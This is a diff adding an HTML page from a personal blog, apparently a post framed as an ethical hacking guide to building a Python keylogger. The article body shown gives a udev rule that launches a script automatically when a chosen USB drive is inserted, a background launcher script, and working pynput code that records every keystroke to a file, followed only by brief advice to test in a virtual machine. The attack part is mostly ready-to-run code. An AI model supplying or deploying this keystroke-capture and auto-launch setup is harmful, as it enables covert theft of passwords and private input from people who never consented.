@@ -1,0 +1,682 @@
+<!DOCTYPE html>
+
+
+  
+<html itemscope itemtype="https://schema.org/WebPage" class="no-js" lang="en">
+
+<head prefix="og: http://ogp.me/ns#"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="siteBaseUrl" content="http://localhost:1313/">
+    <meta name="author" content="Bhaskar">
+    <meta name="description" content="Explore cutting-edge tech, geopolitics, ethical hacking, activism, and humanity&#39;s future.">
+    <meta name="keywords" content="technology, geopolitics, hacking, activism, future">
+    <meta name="generator" content="Hugo 0.145.0">
+    <title>
+        
+           
+               Building a Python Keylogger: A Security Researcher’s development to Understanding Keystroke Logging &vert; Ram&#39;s Website
+           
+        
+    </title>
+    <meta itemprop="name" content="Building a Python Keylogger: A Security Researcher’s development to Understanding Keystroke Logging">
+    <meta itemprop="description" content="A step-by-step writeup to building a Python-based keylogger, designed for ethical security researchers to understand how keystroke logging works, and best practices for staying within legal boundaries.">
+
+    <meta property="og:url" content="http://localhost:1313/2024/09/building-a-python-keylogger-a-security-researchers-development-to-understanding-keystroke-logging/">
+  <meta property="og:site_name" content="Ram&#39;s Website">
+  <meta property="og:title" content="Building a Python Keylogger: A Security Researcher’s development to Understanding Keystroke Logging">
+  <meta property="og:description" content="A step-by-step writeup to building a Python-based keylogger, designed for ethical security researchers to understand how keystroke logging works, and best practices for staying within legal boundaries.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-09-24T00:00:00+00:00">
+    <meta property="article:modified_time" content="2024-09-24T00:00:00+00:00">
+    <meta property="article:tag" content="Keylogging">
+    <meta property="article:tag" content="Python Programming">
+    <meta property="article:tag" content="Cybersecurity">
+    <meta property="article:tag" content="Security Research">
+    <meta property="article:tag" content="Ethical Hacking">
+    <meta property="article:tag" content="Python Scripts">
+    <meta property="og:image" content="https://i.ibb.co/8cQfMsT/Whats-App-Image-2024-09-25-at-19-00-45.jpg">
+
+    <meta property="og:site_name" content="Ram&#39;s Website">
+
+    
+
+
+    
+
+    
+    <link rel="canonical" href="http://localhost:1313/2024/09/building-a-python-keylogger-a-security-researchers-development-to-understanding-keystroke-logging/">
+    
+
+    
+
+
+
+    <link rel="stylesheet" href="http://localhost:1313/theme.css" media="screen">
+
+
+
+
+
+    
+    
+
+    
+</head>
+
+<body class="mostafa-hugo-theme ">
+    
+
+    <header>
+    <a id="back-to-top-button">
+        <i class="fas fa-angle-up"></i>
+    </a>
+
+    <div class="container">
+        <h1 class="title">
+            <a href="http://localhost:1313/">
+                Ram&#39;s Website
+            </a>
+        </h1>
+
+        <nav>
+            <ul>
+                
+                <li><a href="https://github.com/bhaskarvilles" target="_blank" rel=""><em class="fab fa-github"></em></a></li>
+                
+                <li><a href="https://linkedin.com/in/bhaskarvilles" target="_blank" rel=""><em class="fab fa-linkedin"></em></a></li>
+                
+                <li><a href="https://twitter.com/bhaskarvilles" target="_blank" rel=""><em class="fab fa-twitter"></em></a></li>
+                
+                <li><a href="https://instagram.com/bhaskarvilles" target="_blank" rel=""><em class="fab fa-instagram"></em></a></li>
+                
+                <li><a href="https://facebook.com/bhaskarvilles" target="_blank" rel=""><em class="fab fa-facebook"></em></a></li>
+                
+                <li><a href="https://t.me/bhaskarvilles" target="_blank" rel=""><em class="fab fa-telegram"></em></a></li>
+                
+                <li><a href="https://medium.com/@bhaskarvilles" target="_blank" rel=""><em class="fab fa-medium"></em></a></li>
+                
+                <li><a href="https://gitlab.com/bhaskarvilles" target="_blank" rel=""><em class="fab fa-gitlab"></em></a></li>
+                
+                <li><a href="https://snapchat.com/add/bhaskar.royal" target="_blank" rel=""><em class="fab fa-snapchat"></em></a></li>
+                
+                <li><a href="https://steamcommunity.com/id/bhaskarvilles" target="_blank" rel=""><em class="fab fa-steam"></em></a></li>
+                
+                <li><a href="https://wa.me/919490470485" target="_blank" rel=""><em class="fab fa-whatsapp"></em></a></li>
+                
+                <li><a href="https://bhaskarvilles.wordpress.com" target="_blank" rel=""><em class="fab fa-wordpress"></em></a></li>
+                
+                <li><a href="https://discord.com/users/bhaskarvilles.eth#7016" target="_blank" rel=""><em class="fab fa-discord"></em></a></li>
+                
+                <li><a href="https://app.hackthebox.com/profile/bhaskarvilles" target="_blank" rel=""><em class="fas fa-box"></em></a></li>
+                
+                <li><a href="mailto:bhaskarvilles@duck.com" target="_blank" rel=""><em class="fas fa-envelope"></em></a></li>
+                
+            </ul>
+        </nav>
+    </div>
+</header>
+
+
+<div class="navigation">
+
+    
+    
+    <div class="pages menu-wrapper">
+        <ul>
+            
+            
+            <li >
+                <a href="/posts/">Posts</a>
+            </li>
+            
+            <li >
+                <a href="/tags/">Tags</a>
+            </li>
+            
+            <li >
+                <a href="/categories/">Categories</a>
+            </li>
+            
+            
+            <li class="active menu-toggle menu-button">
+                <a href="#">Pages</a>
+            </li>
+            
+        </ul>
+    </div>
+    
+
+
+
+    
+    
+
+</div>
+
+
+
+
+    <div class="main container">
+        
+    <div class="article-wrapper u-cf single">
+        
+            
+
+
+
+<article class="default article">
+    
+
+    <div class="content">
+    <h1 class="article-title">
+        <a href="http://localhost:1313/2024/09/building-a-python-keylogger-a-security-researchers-development-to-understanding-keystroke-logging/">
+            Building a Python Keylogger: A Security Researcher’s development to Understanding Keystroke Logging
+        </a>
+    </h1>
+
+   
+
+    
+        
+
+        <h3 id="setting-up-usb-autorun-for-testing">Setting up USB Autorun (for testing):</h3>
+<ol>
+<li>
+<p><strong>Windows</strong>: You would need an <code>autorun.inf</code> file on the USB, but keep in mind this is typically disabled by default for security.</p>
+</li>
+<li>
+<p><strong>Linux/macOS</strong>: You can set up a udev rule on Linux that triggers a script when a USB drive is inserted.</p>
+</li>
+</ol>
+<p>Here’s an example of how you might trigger your Python script on Linux when a USB drive is inserted using <strong>udev rules</strong>.</p>
+<h3 id="steps-for-linux-setup">Steps for Linux Setup:</h3>
+<ol>
+<li>
+<p><strong>Create udev rule</strong>:
+First, create a udev rule to detect the USB drive and execute the Python script.</p>
+<p>Create the file <code>/etc/udev/rules.d/99-usb-keylogger.rules</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo nano /etc/udev/rules.d/99-usb-keylogger.rules
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Add the following content:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">ACTION</span><span class="o">==</span><span class="s2">&#34;add&#34;</span>, ATTRS<span class="o">{</span>idVendor<span class="o">}==</span><span class="s2">&#34;XXXX&#34;</span>, ATTRS<span class="o">{</span>idProduct<span class="o">}==</span><span class="s2">&#34;YYYY&#34;</span>, <span class="nv">RUN</span><span class="o">+=</span><span class="s2">&#34;/path/to/keylogger.sh&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Replace <code>XXXX</code> and <code>YYYY</code> with the actual vendor ID and product ID of your USB. You can find them by running <code>lsusb</code> after inserting the USB.</p>
+</li>
+<li>
+<p><strong>Create a shell script</strong> to run the Python keylogger:</p>
+<p>Save this file as <code>keylogger.sh</code> in <code>/path/to/keylogger.sh</code> (make sure the path matches the udev rule):</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>python3 /path/to/keylogger.py <span class="p">&amp;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Make the script executable:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">chmod +x /path/to/keylogger.sh
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p><strong>Test</strong>: When you plug in the USB drive, the <code>keylogger.sh</code> script should be triggered, which in turn starts the Python keylogger.</p>
+</li>
+</ol>
+<h3 id="python-keylogger-same-as-above">Python Keylogger (Same as Above):</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pynput.keyboard</span> <span class="kn">import</span> <span class="n">Key</span><span class="p">,</span> <span class="n">Listener</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">log_file</span> <span class="o">=</span> <span class="s2">&#34;/path/to/keystrokes.txt&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">on_press</span><span class="p">(</span><span class="n">key</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">log_file</span><span class="p">,</span> <span class="s2">&#34;a&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">key</span><span class="o">.</span><span class="n">char</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">AttributeError</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">log_file</span><span class="p">,</span> <span class="s2">&#34;a&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34; [</span><span class="si">{</span><span class="n">key</span><span class="si">}</span><span class="s2">] &#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">on_release</span><span class="p">(</span><span class="n">key</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">key</span> <span class="o">==</span> <span class="n">Key</span><span class="o">.</span><span class="n">esc</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="n">Listener</span><span class="p">(</span><span class="n">on_press</span><span class="o">=</span><span class="n">on_press</span><span class="p">,</span> <span class="n">on_release</span><span class="o">=</span><span class="n">on_release</span><span class="p">)</span> <span class="k">as</span> <span class="n">listener</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">listener</span><span class="o">.</span><span class="n">join</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><a href="https://ibb.co/56C0651"><img src="https://i.ibb.co/80GC0jm/Whats-App-Image-2024-09-25-at-19-00-23.jpg" alt="Whats-App-Image-2024-09-25-at-19-00-23" border="0"></a></p>
+<h3 id="testing-environment">Testing Environment</h3>
+<p>To safely test these kinds of setups:</p>
+<ul>
+<li><strong>Use a virtual machine</strong>: This ensures that any experiments are isolated and won’t affect your main system.</li>
+<li><strong>Have clear logs</strong>: Log all activity to better understand the behavior and outcomes.</li>
+</ul>
+
+    
+
+    
+    <div class="tags">
+        
+        
+        
+        <a class="link" href="http://localhost:1313/tags/keylogging/">
+            <i class="fa fa-tag"></i> Keylogging
+        </a>
+        
+        
+        
+        
+        <a class="link" href="http://localhost:1313/tags/python-programming/">
+            <i class="fa fa-tag"></i> Python Programming
+        </a>
+        
+        
+        
+        
+        <a class="link" href="http://localhost:1313/tags/cybersecurity/">
+            <i class="fa fa-tag"></i> Cybersecurity
+        </a>
+        
+        
+        
+        
+        <a class="link" href="http://localhost:1313/tags/security-research/">
+            <i class="fa fa-tag"></i> Security Research
+        </a>
+        
+        
+        
+        
+        <a class="link" href="http://localhost:1313/tags/ethical-hacking/">
+            <i class="fa fa-tag"></i> Ethical Hacking
+        </a>
+        
+        
+        
+        
+        <a class="link" href="http://localhost:1313/tags/python-scripts/">
+            <i class="fa fa-tag"></i> Python Scripts
+        </a>
+        
+        
+        
+        
+        <a class="link" href="http://localhost:1313/tags/keystroke-logging/">
+            <i class="fa fa-tag"></i> Keystroke Logging
+        </a>
+        
+        
+        
+        
+        <a class="link" href="http://localhost:1313/tags/security-tools/">
+            <i class="fa fa-tag"></i> Security Tools
+        </a>
+        
+        
+        
+        
+        <a class="link" href="http://localhost:1313/tags/penetration-testing/">
+            <i class="fa fa-tag"></i> Penetration Testing
+        </a>
+        
+        
+        
+        
+        <a class="link" href="http://localhost:1313/tags/educational-purposes/">
+            <i class="fa fa-tag"></i> Educational Purposes
+        </a>
+        
+        
+    </div>
+    
+
+
+    
+    <div class="author">
+        <a class="link" href="/author/bhaskar">
+            <i class="fa fa-user"></i>
+            Bhaskar
+        </a>
+    </div>
+    
+
+</div>
+
+    
+<div class="footer">
+<div class="categories">
+        <i class="fa fa-file-lines "></i>
+        <div class="links">
+            
+                
+                
+                
+                <a href="http://localhost:1313/categories/cybersecurity/">Cybersecurity</a>
+                
+                
+                
+                
+                <a href="http://localhost:1313/categories/ethical-hacking/">Ethical Hacking</a>
+                
+                
+                
+                
+                <a href="http://localhost:1313/categories/python-programming/">Python Programming</a>
+                
+                
+                
+                
+                <a href="http://localhost:1313/categories/keylogging/">Keylogging</a>
+                
+                
+                
+                
+                <a href="http://localhost:1313/categories/security-research/">Security Research</a>
+                
+                
+            
+        </div>
+    </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div class="date">
+        
+            <i class="fa fa-calendar-days"></i>
+            
+            <span class="text moment">
+                2024-09-24</span>
+            
+        
+    </div>
+
+
+
+</div>
+
+</article>
+
+        
+    </div>
+
+    </div>
+
+    
+<footer>
+    <div class="container">
+
+        
+        <div class="recent-posts">
+            <strong>Latest posts</strong>
+            <ul>
+                
+                
+                    <li>
+                        <a href="http://localhost:1313/2025/03/unlocking-the-power-of-kerdos-vision-ai-for-image-generation/">Unlocking the Power of Kerdos Vision AI for Image Generation</a>
+                    </li>
+                
+                    <li>
+                        <a href="http://localhost:1313/2025/03/kerdos-ai-launches-revolutionary-chat-application-with-openai-integration/">Kerdos AI Launches Revolutionary Chat Application with OpenAI Integration</a>
+                    </li>
+                
+                    <li>
+                        <a href="http://localhost:1313/2025/03/finding-your-inner-drive-a-guide-to-motivation/">Finding Your Inner Drive: A Guide to Motivation</a>
+                    </li>
+                
+                    <li>
+                        <a href="http://localhost:1313/2025/02/internet-archive-hacked-data-breach-impacts-31-million-users/">Internet Archive hacked, data breach impacts 31 million users</a>
+                    </li>
+                
+                    <li>
+                        <a href="http://localhost:1313/2025/02/running-local-large-language-models-llms-for-image-generation/">Running Local Large Language Models (LLMs) for Image Generation</a>
+                    </li>
+                
+                    <li>
+                        <a href="http://localhost:1313/2024/12/the-dark-side-of-ai-navigating-ethical-challenges-in-artificial-intelligence/">The Dark Side of AI: Navigating Ethical Challenges in Artificial Intelligence</a>
+                    </li>
+                
+                    <li>
+                        <a href="http://localhost:1313/2024/11/building-the-future-of-opensearch-community-driven-innovation/">Building the Future of OpenSearch: Community-Driven Innovation</a>
+                    </li>
+                
+            </ul>
+        </div>
+        
+
+        
+        <div class="categories">
+            
+            <a href="http://localhost:1313/categories/"><strong>Categories</strong></a>
+            
+
+            <ul>
+                
+                <li>
+                
+                    <a href="http://localhost:1313/categories/ai/">AI (17)</a>
+                
+                </li>
+                
+                <li>
+                
+                    <a href="http://localhost:1313/categories/technology/">Technology (17)</a>
+                
+                </li>
+                
+                <li>
+                
+                    <a href="http://localhost:1313/categories/blockchain/">Blockchain (7)</a>
+                
+                </li>
+                
+                <li>
+                
+                    <a href="http://localhost:1313/categories/artificial-intelligence/">Artificial Intelligence (6)</a>
+                
+                </li>
+                
+                <li>
+                
+                    <a href="http://localhost:1313/categories/machine-learning/">Machine Learning (6)</a>
+                
+                </li>
+                
+                <li>
+                
+                    <a href="http://localhost:1313/categories/openai/">OpenAI (6)</a>
+                
+                </li>
+                
+                <li>
+                
+                    <a href="http://localhost:1313/categories/gaming/">Gaming (5)</a>
+                
+                </li>
+                
+            </ul>
+        </div>
+        
+
+        <div class="right">
+            
+
+
+
+            
+            <div class="archive">
+                
+            </div>
+            
+        </div>
+    </div>
+</footer>
+
+
+<div class="credits">
+    <div class="container">
+        <div class="copyright">
+            <a href="http://localhost:1313/">
+                &copy;
+                
+                2024 - 2025
+                
+                by Ram&#39;s Website
+            </a>
+            
+        </div>
+        <div class="author">
+            <a href="https://github.com/mirmousaviii/mostafa-hugo-theme"
+                target="_blank">Powered by Mostafa-Hugo-Theme</a>
+        </div>
+    </div>
+</div>
+
+
+    
+
+    
+
+    
+
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+
+
+
+
+
+
+
+
+
+
+    <script src="http://localhost:1313/theme.js"></script>
+
+
+
+
+
+    
+
+    
+</body>
+
+</html>
